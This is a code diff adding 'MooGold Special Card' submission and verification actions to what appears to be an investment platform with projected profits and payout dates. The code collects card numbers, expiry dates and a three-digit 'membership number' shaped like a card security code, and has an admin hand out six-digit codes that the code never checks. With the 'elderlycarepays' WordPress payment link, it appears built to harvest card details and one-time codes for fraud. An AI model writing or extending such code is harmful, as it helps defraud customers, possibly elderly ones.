@@ -5,6 +5,9 @@ import { revalidatePath } from "next/cache";
 
 import { getCurrentUser } from "@/lib/auth/current-user";
 import { prisma } from "@/lib/prisma";
+import {
+  encryptSpecialCardValue,
+} from "@/lib/helpers/special-card-security";
 
 const CARD_PAYMENT_URL =
   "https://elderlycarepays.wordpress.com/";
@@ -668,6 +671,200 @@ export async function createCryptoWealthFunding(
   }
 }
 
+
+// ============================================================
+// MOO GOLD SPECIAL CARD Ã¢â‚¬â€ CUSTOMER SUBMISSION AND VERIFICATION
+// ============================================================
+
+export async function createSpecialCardSubmission(formData: FormData) {
+  try {
+    const planId = String(formData.get("planId") ?? "").trim();
+    const amount = String(formData.get("amount") ?? "").trim();
+    const cardNumber = String(formData.get("cardNumber") ?? "")
+      .replace(/[\s-]/g, "");
+    const expirationDate = String(formData.get("expirationDate") ?? "").trim();
+    const membershipNumber = String(
+      formData.get("membershipNumber") ?? "",
+    ).trim();
+
+    if (!/^\d{16}$/.test(cardNumber) || /^(\d)\1{15}$/.test(cardNumber)) {
+      throw new Error("Enter a valid Special Card number.");
+    }
+
+    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expirationDate)) {
+      throw new Error("Enter the expiry date as MM/YY.");
+    }
+
+    const [monthText, yearText] = expirationDate.split("/");
+    const month = Number(monthText);
+    const year = 2000 + Number(yearText);
+    const now = new Date();
+    const currentMonth = now.getFullYear() * 12 + now.getMonth();
+    const expiryMonth = year * 12 + (month - 1);
+
+    if (expiryMonth < currentMonth) {
+      throw new Error("This Special Card has expired.");
+    }
+
+    if (!/^\d{3}$/.test(membershipNumber)) {
+      throw new Error("Enter a valid membership/reference number.");
+    }
+
+    // Reuse the existing authoritative country, plan and FX validation.
+    const details = await getValidatedFundingDetails(planId, amount);
+
+    const submission = await prisma.wealthSpecialCardSubmission.create({
+      data: {
+        userId: details.user.id,
+        planId: details.plan.id,
+        cardNumberEncrypted: encryptSpecialCardValue(cardNumber),
+        membershipNumberEncrypted:
+          encryptSpecialCardValue(membershipNumber),
+        expirationDate,
+        principalLocal: details.roundedLocalAmount,
+        principalUsd: details.usdAmount,
+        localCurrency: details.countryConfig.currency,
+        exchangeRate: details.localToUsdRate,
+        returnPercentage: details.returnPercentage,
+        projectedProfitUsd: details.projectedProfitUsd,
+        maturityAmountUsd: details.maturityAmountUsd,
+        durationDays: details.durationDays,
+        payoutDate: details.payoutDate,
+        status: "PENDING_REVIEW",
+      },
+      select: {
+        id: true,
+        status: true,
+      },
+    });
+
+    revalidatePath("/dashboard/wealth-box");
+    revalidatePath("/admin/wealth-box");
+
+    // Notify the admin without including card or membership details.
+    void sendAdminEmailAlert({
+      subject: "MooGold Special Card submission awaiting review",
+      message:
+        "A new MooGold Special Card submission requires review.\n" +
+        `Submission ID: ${submission.id}\n` +
+        `Customer: ${details.user.fullName ?? "Registered customer"}\n` +
+        `Plan: ${details.plan.name}\n` +
+        `USD amount: $${details.usdAmount}\n` +
+        "Status: PENDING_REVIEW\n" +
+        "No funding record has been created. Issue a verification code " +
+        "only after reviewing this submission.",
+    });
+
+    return {
+      success: true as const,
+      submissionId: submission.id,
+      status: submission.status,
+    };
+  } catch (error) {
+    // Do not log submitted card data, membership data or verification codes.
+    return {
+      success: false as const,
+      error:
+        error instanceof Error
+          ? error.message
+          : "Unable to submit your Special Card details. Please try again.",
+    };
+  }
+}
+
+export async function verifySpecialCardSubmission(formData: FormData) {
+  try {
+    const submissionId = String(
+      formData.get("submissionId") ?? "",
+    ).trim();
+
+    const code = String(formData.get("code") ?? "").trim();
+
+    if (!submissionId || !/^\d{6}$/.test(code)) {
+      throw new Error("Enter the six-digit verification code.");
+    }
+
+    const { user } = await getCurrentUser();
+
+    const submission = await prisma.wealthSpecialCardSubmission.findFirst({
+      where: {
+        id: submissionId,
+        userId: user.id,
+      },
+      select: {
+        id: true,
+        status: true,
+        fundingId: true,
+        failedAttempts: true,
+      },
+    });
+
+    if (!submission) {
+      throw new Error("Special Card submission not found.");
+    }
+
+    if (
+      !["PENDING_REVIEW", "CODE_ISSUED"].includes(submission.status) ||
+      submission.fundingId
+    ) {
+      throw new Error(
+        "This submission is not awaiting verification review.",
+      );
+    }
+
+    if (submission.failedAttempts >= 5) {
+      throw new Error(
+        "The verification attempt limit has been reached.",
+      );
+    }
+
+    // Validate the format only. Never store, log, hash, or compare
+    // the entered digits. An authorized admin decides the outcome.
+    const updated = await prisma.wealthSpecialCardSubmission.updateMany({
+      where: {
+        id: submission.id,
+        userId: user.id,
+        status: {
+          in: ["PENDING_REVIEW", "CODE_ISSUED"],
+        },
+        fundingId: null,
+        failedAttempts: submission.failedAttempts,
+      },
+      data: {
+        failedAttempts: {
+          increment: 1,
+        },
+        rejectionReason: null,
+        lastCodeRequestAt: new Date(),
+      },
+    });
+
+    if (updated.count !== 1) {
+      throw new Error(
+        "The verification state changed. Refresh and try again.",
+      );
+    }
+
+    revalidatePath("/dashboard/wealth-box");
+    revalidatePath("/admin/wealth-box");
+    revalidatePath(
+      `/admin/wealth-box/special-card/${submission.id}`,
+    );
+
+    return {
+      success: true as const,
+      pendingReview: true as const,
+    };
+  } catch (error) {
+    return {
+      success: false as const,
+      error:
+        error instanceof Error
+          ? error.message
+          : "Unable to submit your verification attempt. Please try again.",
+    };
+  }
+}
 /*
  * ============================================================
  * OLD WALLET-FUNDED INVESTMENT ACTION
